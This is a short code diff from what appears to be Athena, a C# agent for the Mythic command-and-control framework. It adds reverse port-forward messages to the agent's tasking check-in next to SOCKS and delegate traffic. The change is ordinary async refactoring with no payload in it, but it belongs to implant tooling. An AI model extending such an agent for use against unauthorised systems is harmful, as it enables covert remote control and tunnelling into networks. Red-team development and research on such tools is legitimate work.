@@ -71,17 +71,17 @@ namespace Athena
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
                 Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
-                await Task.WhenAll(responseTask, delegateTask, socksTask);
-
-                List<string> responses = await responseTask;
+                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
 
                 GetTasking gt = new GetTasking()
                 {
                     action = "get_tasking",
                     tasking_size = -1,
-                    delegates = await delegateTask,
-                    socks = await socksTask,
-                    responses = responses,
+                    delegates = delegateTask.Result,
+                    socks = socksTask.Result,
+                    responses = responseTask.Result,
+                    rpfwd = rpFwdTask.Result,
                 };
                 try
                 {
